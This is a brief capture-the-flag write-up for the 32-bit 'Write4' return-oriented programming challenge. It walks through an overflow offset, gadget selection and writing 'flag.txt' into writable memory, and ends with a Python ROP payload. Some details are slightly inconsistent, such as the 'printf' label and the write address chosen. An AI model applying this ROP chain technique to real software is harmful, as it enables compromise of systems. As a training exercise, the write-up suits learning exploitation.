This is a Quick Writeup on **Write4** challenge

## For 32 bit

In this challenge , there is a buffer overflow vunerability in function *pwnme* in libc . As this part is repeated in previous challenges , eip offset will be 44 directly.

On small reversing , we see **print_file** function which do *push eax" takes an location of where filename is stored . So our task is to write file name which is "flag.txt" in a binary with the help of ROPgadgets .

First we try to find a gadget which help us to mov some value to some *location*
![mov]("./img/mov32.png")
Cool we found a gadget which will mov ebp value to edi location . lets try to find a ROPgadget which will assign values to these registers.
![popop]("./img/popop32.png")
now we have tools to write in a memory .
lets find the part with read & write permissions 
![vmmap]("./img/vmmap32.png")
ok we got multiple region I choosen 0x804a0c4 location to write .
now as the file name is "flag.txt" and we are using ebp which can store only 4 bytes of data. so in first writing we just wrote "flag" at that location , 4 bytes after that location we write ".txt". After writing we are gonna call print_file function , I just given him  filename location just after calling , but in GDB session I saw fopen taking ebp+8 and my filename location 4 bytes earlier  , so I added 4 bytes Junk before .

Final Exploit looks like this:
```python
printf = p32(0x080483D0)
# 0x08048543 : mov dword ptr [edi], ebp ; ret
mov = p32(0x08048543)
# 0x080485aa : pop edi ; pop ebp ; ret
popop = p32(0x080485aa)
write1 = p32(0x804a0c0)
write2 = p32(0x804a0c4)

payload = flat(
    b"a"*44,
    popop,
    write1,
    b'flag',
    mov,
    popop,
    write2,
    b'.txt',
    mov,     
    printf,
    b"xxxx",
    write1  
)
```















